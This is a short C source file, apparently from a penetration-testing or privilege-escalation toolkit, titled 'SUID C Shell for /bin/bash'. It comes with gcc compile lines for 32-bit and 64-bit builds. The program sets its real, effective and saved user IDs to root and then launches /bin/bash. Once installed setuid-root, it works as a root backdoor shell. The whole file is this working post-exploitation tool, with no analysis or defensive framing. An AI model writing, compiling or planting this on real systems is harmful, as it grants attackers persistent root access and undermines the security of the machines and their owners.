/* SUID C Shell for /bin/bash
   gcc -o suid suid.c 
   for 32b: gcc -m32 -o suid suid.c
*/

int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}     
